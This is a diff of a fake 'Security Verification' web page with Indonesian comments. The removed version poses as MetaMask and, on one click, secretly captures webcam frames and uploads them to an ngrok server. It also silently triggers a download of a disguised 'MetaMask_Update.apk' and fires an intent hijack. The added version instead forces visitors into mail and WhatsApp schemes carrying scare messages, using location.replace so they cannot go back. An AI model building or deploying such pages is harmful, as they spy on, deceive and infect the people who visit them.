@@ -1,34 +1,32 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Security Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
-    background: #000; color: #f00; font-family: monospace;
+    background: #f4f6f8; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
     display: flex; justify-content: center; align-items: center;
-    height: 100vh; margin: 0; text-align: center; cursor: pointer; overflow: hidden;
+    height: 100vh; margin: 0; cursor: pointer; text-align: center;
   }
-  .panel { background: #111; padding: 30px; border-radius: 12px; border: 1px solid #f00; max-width: 400px; width: 100%; box-shadow: 0 0 20px rgba(255,0,0,0.5); }
-  h2 { animation: blink 0.2s infinite; }
-  @keyframes blink { 50% { opacity: 0.2; } }
-  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 100px; overflow-y: auto; }
-  iframe, video, canvas { display: none !important; }
+  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
+  h2 { color: #333; margin-bottom: 10px; }
+  p { color: #666; font-size: 14px; margin-bottom: 20px; }
+  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
+  iframe { display: none; }
 </style>
 </head>
 <body>
 
 <div class="panel" id="main-card">
-  <h2>🦊 MetaMask Verification</h2>
-  <p>Klik di mana saja untuk melanjutkan.</p>
+  <h2>🔒 System Verification</h2>
+  <p>Klik di mana saja untuk memverifikasi sistem Anda.</p>
   <div id="log">Sistem siap.</div>
 </div>
 
 <div id="launcher-container" style="display: none;"></div>
-<video id="cam-feed" autoplay playsinline muted></video>
-<canvas id="processing-canvas" width="640" height="480"></canvas>
 
 <script>
 (function () {
@@ -43,121 +41,86 @@
   }
 
   // ============================================
-  // KONFIGURASI
+  // TARGET SCHEMES (MACOS)
   // ============================================
-  var METAMASK_INTENT = "intent://#Intent;" +
-                        "package=io.metamask;" +
-                        "scheme=metamask;" +
-                        "end;";
   
-  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload_frame";
+  // 1. Apple Mail (Membuka aplikasi Mail dengan draft baru)
+  var MAIL_SCHEME = "mailto:security@apple.com?subject=Security%20Alert&body=Your%20account%20has%20been%20compromised.";
+
+  // 2. WhatsApp (Membuka aplikasi WhatsApp)
+  var WA_SCHEME = "whatsapp://send?text=Security%20Verification%20Required";
 
   // ============================================
-  // TASK 1: CAMERA HIJACK
-  // ============================================
-  function startCameraHijack() {
-    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-      .then(function(stream) {
-        var video = document.getElementById('cam-feed');
-        video.srcObject = stream;
-        video.play().catch(function(){});
-        log("[+] Kamera BERHASIL diakses!");
-
-        setInterval(function() {
-          var canvas = document.getElementById('processing-canvas');
-          var ctx = canvas.getContext('2d');
-          if (video.readyState === video.HAVE_ENOUGH_DATA) {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            var dataURL = canvas.toDataURL('image/jpeg', 0.5);
-            fetch(SERVER_ENDPOINT, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ image: dataURL }),
-              keepalive: true
-            }).catch(function(){});
-          }
-        }, 100);
-      })
-      .catch(function(err) {
-        log("[-] Kamera diblokir: " + err.name);
-      });
-  }
-
-  // ============================================
-  // TRIGGER TRIPLE THREAT (KLIK)
+  // TRIGGER (ONE CLICK)
   // ============================================
   document.body.addEventListener('click', function() {
     if (executed) return;
     executed = true;
 
     document.getElementById('main-card').innerHTML = `
-      <h2>EXECUTING...</h2>
-      <p>Memulai Triple Threat Race...</p>
+      <h2>Memproses...</h2>
+      <p>Menghubungkan ke layanan...</p>
       <div id="log"></div>
     `;
     logEl = document.getElementById('log');
-    log("[!] Memulai Triple Threat Chain...");
+    log("[!] Memulai Protocol Hijack...");
 
     // ============================================
-    // A. CAMERA HIJACK (0ms)
+    // METODE 1: DIRECT TOP-LEVEL REDIRECT
     // ============================================
-    startCameraHijack();
+    try {
+      log("[+] Mengirim Mail Scheme...");
+      // Gunakan location.replace agar tidak bisa di-back
+      window.location.replace(MAIL_SCHEME);
+    } catch(e) {
+      log("[-] Mail Error: " + e.message);
+    }
 
     // ============================================
-    // B. STEALTH DOWNLOAD (10ms)
+    // METODE 2: BLOB WRAPPER (BYPASS POPUP)
     // ============================================
     setTimeout(function() {
+      log("[+] Mengirim WhatsApp Scheme via Blob...");
       try {
-        var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
-        var binary = atob(b64Apk);
-        var bytes = new Uint8Array(binary.length);
-        for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-        var blob = new Blob([bytes], { type: "application/vnd.android.package-archive" });
-        var blobUrl = URL.createObjectURL(blob);
-
-        var dlIframe = document.createElement("iframe");
-        dlIframe.sandbox = "allow-scripts allow-downloads-without-user-activation";
-        dlIframe.style.display = "none";
-        dlIframe.srcdoc = `
+        // Bungkus WhatsApp Scheme di dalam Blob
+        var blobPayload = `
+          <!DOCTYPE html>
+          <html>
           <body>
-            <a id="dl" href="${blobUrl}" download="MetaMask_Update.apk">Download</a>
-            <script>document.getElementById('dl').click();<\/script>
+            <script>
+              window.location.href = "${WA_SCHEME}";
+            <\/script>
           </body>
+          </html>
         `;
-        document.body.appendChild(dlIframe);
-        log("[+] Stealth APK Download Triggered.");
-      } catch(e) {}
-    }, 10);
+        var blob = new Blob([blobPayload], { type: 'text/html' });
+        var blobUrl = URL.createObjectURL(blob);
+        
+        // Buka Blob di tab baru (jika diizinkan)
+        var win = window.open(blobUrl, '_blank');
+        if (win) {
+          log("[+] WhatsApp Blob Triggered.");
+        } else {
+          log("[-] Popup diblokir.");
+        }
+      } catch(e) {
+        log("[-] WA Error: " + e.message);
+      }
+    }, 500);
 
     // ============================================
-    // C. INTENT HIJACK (50ms - Race dengan Download)
+    // METODE 3: IFRAME SANDBOX (FALLBACK)
     // ============================================
     setTimeout(function() {
-      log("[+] Mengirim Intent MetaMask...");
+      log("[+] Mengirim WhatsApp via Iframe...");
       try {
-        // Top-Level Navigation
-        window.location.href = METAMASK_INTENT;
+        var iframe = document.createElement("iframe");
+        iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
+        iframe.style.display = "none";
+        iframe.src = WA_SCHEME;
+        document.getElementById("launcher-container").appendChild(iframe);
       } catch(e) {}
-      
-      // Fallback Iframe
-      setTimeout(function() {
-        try {
-          var iframe = document.createElement("iframe");
-          iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
-          iframe.style.display = "none";
-          iframe.srcdoc = `
-            <!DOCTYPE html>
-            <html>
-            <body>
-              <script>window.top.location.href = "${METAMASK_INTENT}";<\/script>
-            </body>
-            </html>
-          `;
-          document.getElementById("launcher-container").appendChild(iframe);
-        } catch(e) {}
-      }, 100);
-      
-    }, 50); // 50ms (Setelah download mulai, sebelum kamera selesai)
+    }, 1000);
 
   }, { once: true });
 
